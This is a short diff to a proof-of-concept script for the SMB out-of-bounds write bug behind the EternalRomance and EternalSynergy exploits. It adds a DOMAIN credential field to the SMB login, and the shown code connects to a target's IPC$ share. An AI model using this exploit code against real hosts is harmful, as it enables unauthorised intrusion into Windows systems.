@@ -7,8 +7,9 @@ import sys
 PoC: demonstrates the bug that NSA eternalromance and eternalsynergy use for OOB write
 '''
 
-USERNAME = ''
-PASSWORD = ''
+USERNAME = ''		#Edit username
+PASSWORD = ''		#Edit password
+DOMAIN = ''		#Edit domain
 
 if len(sys.argv) != 3:
 	print("{} <ip> <pipe_name>".format(sys.argv[0]))
@@ -18,7 +19,7 @@ target = sys.argv[1]
 pipe_name = sys.argv[2]
 
 conn = MYSMB(target)
-conn.login(USERNAME, PASSWORD)
+conn.login(USERNAME, PASSWORD, DOMAIN)
 
 tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
 conn.set_default_tid(tid)
